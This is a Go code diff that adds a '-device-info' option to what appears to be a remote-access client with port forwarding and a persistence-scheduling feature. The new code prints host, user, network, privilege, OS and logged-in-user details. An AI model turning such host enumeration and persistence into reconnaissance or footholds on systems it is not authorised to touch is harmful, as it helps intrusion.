@@ -427,6 +427,211 @@ func handlePortForward(conn net.Conn, root string, hdr Header, _ []byte) {
         _ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: started %s", target)}, nil)
 }
 
+// ---------- device info functionality ----------
+
+// printDeviceInfo determines the OS and calls the appropriate function
+func printDeviceInfo() {
+	fmt.Println("=== Device Information ===")
+	
+	// Common info for all platforms
+	printCommonDeviceInfo()
+	
+	// OS-specific info
+	if runtime.GOOS == "windows" {
+		printWindowsDeviceInfo()
+	} else {
+		printLinuxDeviceInfo()
+	}
+}
+
+// printCommonDeviceInfo prints information common to all platforms
+func printCommonDeviceInfo() {
+	// System information
+	hostname, _ := os.Hostname()
+	fmt.Printf("Hostname: %s\n", hostname)
+	fmt.Printf("OS: %s\n", runtime.GOOS)
+	fmt.Printf("Architecture: %s\n", runtime.GOARCH)
+	fmt.Printf("Go Version: %s\n", runtime.Version())
+	
+	// User information
+	currentUser, err := user.Current()
+	if err == nil {
+		fmt.Printf("User ID: %s\n", currentUser.Uid)
+		fmt.Printf("Username: %s\n", currentUser.Username)
+		fmt.Printf("Home Directory: %s\n", currentUser.HomeDir)
+	} else {
+		fmt.Printf("User Info Error: %v\n", err)
+	}
+	
+	// Process information
+	fmt.Printf("Process ID: %d\n", os.Getpid())
+	executable, _ := os.Executable()
+	fmt.Printf("Executable: %s\n", executable)
+	cwd, _ := os.Getwd()
+	fmt.Printf("Current Directory: %s\n", cwd)
+	
+	// Network interfaces
+	fmt.Println("\n=== Network Interfaces ===")
+	ifaces, err := net.Interfaces()
+	if err == nil {
+		for _, iface := range ifaces {
+			// Skip loopback interfaces
+			if iface.Flags&net.FlagLoopback != 0 {
+				continue
+			}
+			
+			addrs, err := iface.Addrs()
+			if err != nil || len(addrs) == 0 {
+				continue
+			}
+			
+			fmt.Printf("\nInterface: %s\n", iface.Name)
+			fmt.Printf("  MAC Address: %s\n", iface.HardwareAddr)
+			fmt.Printf("  Flags: %v\n", iface.Flags)
+			
+			// Print IP addresses
+			for _, addr := range addrs {
+				var ip net.IP
+				switch v := addr.(type) {
+				case *net.IPNet:
+					ip = v.IP
+				case *net.IPAddr:
+					ip = v.IP
+				}
+				if ip == nil || ip.IsLoopback() {
+					continue
+				}
+				ipv4 := ip.To4()
+				if ipv4 != nil {
+					fmt.Printf("  IPv4: %s\n", ipv4)
+				} else if ip.To16() != nil {
+					fmt.Printf("  IPv6: %s\n", ip)
+				}
+			}
+		}
+	} else {
+		fmt.Printf("Error getting network interfaces: %v\n", err)
+	}
+}
+
+// printWindowsDeviceInfo prints Windows-specific information
+func printWindowsDeviceInfo() {
+	fmt.Println("\n=== Windows System Information ===")
+	
+	// Check if running as Administrator
+	isAdmin := isWindowsAdmin()
+	fmt.Printf("Running as Administrator: %v\n", isAdmin)
+	
+	// Get Windows version
+	cmd := exec.Command("cmd", "/c", "ver")
+	output, err := cmd.Output()
+	if err == nil {
+		fmt.Printf("Windows Version: %s\n", strings.TrimSpace(string(output)))
+	}
+	
+	// Get more detailed system information
+	fmt.Println("\n=== Detailed Windows Information ===")
+	
+	// Get system info
+	cmd = exec.Command("systeminfo", "/fo", "list", "/fi", "\"OS Name\"", "/fi", "\"OS Version\"")
+	output, err = cmd.Output()
+	if err == nil {
+		fmt.Printf("%s\n", strings.TrimSpace(string(output)))
+	}
+	
+	// Get logged-in users
+	fmt.Println("\n=== Logged-in Users ===")
+	cmd = exec.Command("query", "user")
+	output, err = cmd.Output()
+	if err == nil {
+		fmt.Printf("%s\n", strings.TrimSpace(string(output)))
+	}
+}
+
+// isWindowsAdmin checks if the current process is running with admin privileges
+func isWindowsAdmin() bool {
+	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
+	return err == nil
+}
+
+// printLinuxDeviceInfo prints Linux-specific information
+func printLinuxDeviceInfo() {
+	fmt.Println("\n=== Linux System Information ===")
+	
+	// Check if root
+	isRoot := os.Geteuid() == 0
+	fmt.Printf("Running as root: %v\n", isRoot)
+	
+	// Get distribution info if available
+	if _, err := os.Stat("/etc/os-release"); err == nil {
+		data, err := os.ReadFile("/etc/os-release")
+		if err == nil {
+			osRelease := string(data)
+			lines := strings.Split(osRelease, "\n")
+			for _, line := range lines {
+				if strings.HasPrefix(line, "NAME=") || strings.HasPrefix(line, "VERSION=") {
+					fmt.Println(line)
+				}
+			}
+		}
+	}
+	
+	// Get kernel version
+	cmd := exec.Command("uname", "-r")
+	output, err := cmd.Output()
+	if err == nil {
+		fmt.Printf("Kernel Version: %s\n", strings.TrimSpace(string(output)))
+	}
+	
+	// Get CPU info
+	if _, err := os.Stat("/proc/cpuinfo"); err == nil {
+		data, err := os.ReadFile("/proc/cpuinfo")
+		if err == nil {
+			cpuinfo := string(data)
+			lines := strings.Split(cpuinfo, "\n")
+			cpuModel := ""
+			cpuCount := 0
+			
+			for _, line := range lines {
+				if strings.HasPrefix(line, "model name") {
+					cpuCount++
+					if cpuModel == "" {
+						parts := strings.SplitN(line, ":", 2)
+						if len(parts) == 2 {
+							cpuModel = strings.TrimSpace(parts[1])
+						}
+					}
+				}
+			}
+			
+			fmt.Printf("CPU: %s (x%d)\n", cpuModel, cpuCount)
+		}
+	}
+	
+	// Get memory info
+	if _, err := os.Stat("/proc/meminfo"); err == nil {
+		data, err := os.ReadFile("/proc/meminfo")
+		if err == nil {
+			meminfo := string(data)
+			lines := strings.Split(meminfo, "\n")
+			
+			for _, line := range lines {
+				if strings.HasPrefix(line, "MemTotal:") || strings.HasPrefix(line, "MemFree:") {
+					fmt.Println(line)
+				}
+			}
+		}
+	}
+	
+	// Get logged-in users
+	fmt.Println("\n=== Logged-in Users ===")
+	cmd = exec.Command("who")
+	output, err = cmd.Output()
+	if err == nil {
+		fmt.Printf("%s\n", strings.TrimSpace(string(output)))
+	}
+}
+
 // ---------- persistence scheduling ----------
 
 // -- Windows
@@ -611,10 +816,15 @@ func main() {
 	testConnection := flag.Bool("test-connection", false, "Test connection to server and exit")
 	persist := flag.Bool("persist", false, "Schedule persistence on the system (requires appropriate permissions)")
 	debug := flag.Bool("debug", false, "Print debug info and exit")
+	deviceInfo := flag.Bool("device-info", false, "Print device information and exit")
 	flag.Parse()
-
 	if *debug {
 		debugPrint(*server, *port, *token, *clientID, *root)
+		os.Exit(0)
+	}
+
+	if *deviceInfo {
+		printDeviceInfo()
 		os.Exit(0)
 	}
 
